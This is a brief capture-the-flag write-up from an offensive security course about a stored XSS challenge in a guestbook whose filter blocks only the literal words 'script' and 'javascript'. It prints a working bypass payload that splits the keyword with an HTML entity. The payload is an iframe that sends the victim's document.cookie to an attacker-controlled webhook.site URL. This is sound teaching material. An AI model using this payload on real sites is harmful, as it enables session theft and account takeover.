# GuestBook (XSS)

**Category:** web / stored XSS via HTML-entity filter bypass · **Course:** Offensive Security (PoliTo)

## Vulnerability

The guestbook blocks the literal substrings `script` and `javascript` in submitted entries, but does nothing to stop the same protocol/tag written with an HTML character entity in the middle of the keyword — browsers still decode and honour it.

## Exploitation

Both attempts below were tried, in order:

1. A direct `<iframe src="https://webhook.site/...">` — blocked by the `script` / `javascript` filter.
2. The winning payload, breaking up the filtered keyword with an HTML entity (`&#99;` = `c`) so the string `javascript` never appears literally in the source, while browsers still parse it as the `javascript:` pseudo-protocol once decoded:

   ```html
   <a href="javas&#99;ript:alert(document.cookie)">Click me</a>
   <iframe src="javas&#99;ript:fetch('https://webhook.site/...?c='+document.cookie)"></iframe>
   ```

3. Getting a victim (the review bot/admin) to load the entry triggers the `iframe`'s `javascript:` URL, exfiltrating their cookie to an attacker-controlled webhook.

## Flag

`offsec{...redacted...}` — captured against the remote instance; redacted here per standard write-up etiquette.

## Note

Only the solution notes were preserved for this challenge (no app source retained).
